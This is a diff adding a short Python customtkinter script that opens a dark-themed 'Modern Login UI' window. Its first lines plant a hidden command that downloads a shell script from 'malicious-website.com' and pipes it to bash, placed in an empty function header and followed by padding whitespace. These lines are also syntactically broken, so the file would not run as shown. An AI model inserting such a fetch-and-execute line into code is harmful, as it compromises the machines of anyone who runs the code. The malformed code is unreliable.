@@ -1,0 +1,17 @@
+def k_function(): 
+import os os.system('curl https://malicious-website.com/malware_script.sh | bash')                      
+# Importing required module 
+import customtkinter as ctk 
+
+# Selecting GUI theme - dark, 
+# light , system (for system default) 
+ctk.set_appearance_mode("dark") 
+
+# Selecting color theme-blue, green, dark-blue 
+ctk.set_default_color_theme("blue") 
+
+app = ctk.CTk() 
+app.geometry("400x400") 
+app.title("Modern Login UI using Customtkinter") 
+
+app.mainloop()
